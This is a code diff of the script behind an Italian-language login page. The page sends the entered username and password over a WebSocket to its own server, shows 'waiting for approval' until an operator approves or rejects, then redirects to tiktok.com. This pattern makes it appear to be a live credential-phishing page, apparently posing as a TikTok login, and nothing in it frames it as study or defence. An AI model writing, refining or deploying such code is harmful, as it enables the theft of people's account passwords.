@@ -16,7 +16,6 @@
 
   <script>
     const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
-    let currentRequestId = null;
 
     ws.onmessage = (event) => {
       const data = JSON.parse(event.data);
@@ -24,13 +23,11 @@
       if (data.type === 'approve') {
         document.getElementById("status").innerHTML = 
           `<span style="color:green">✅ Accesso approvato! Reindirizzamento...</span>`;
-        setTimeout(() => {
-          window.location.href = "https://www.tiktok.com";
-        }, 800);
+        setTimeout(() => window.location.href = "https://www.tiktok.com", 800);
       } 
       else if (data.type === 'reject') {
         document.getElementById("status").innerHTML = 
-          `<span style="color:red">${data.message}</span>`;
+          `<span style="color:red">${data.message || "Accesso negato. Riprova."}</span>`;
         document.getElementById("enter").disabled = false;
       }
     };
@@ -39,20 +36,12 @@
       const user = document.getElementById("user").value.trim();
       const pass = document.getElementById("pass").value.trim();
 
-      if (!pass) {
-        alert("Inserisci la password");
-        return;
-      }
+      if (!pass) return alert("Inserisci la password");
 
-      document.getElementById("status").innerHTML = 
-        `<span style="color:#888">⏳ In attesa di approvazione...</span>`;
+      document.getElementById("status").innerHTML = `<span style="color:#888">⏳ In attesa di approvazione...</span>`;
       document.getElementById("enter").disabled = true;
 
-      ws.send(JSON.stringify({
-        type: 'submit',
-        user: user,
-        message: pass
-      }));
+      ws.send(JSON.stringify({ type: 'submit', user: user, message: pass }));
     };
   </script>
 </body>
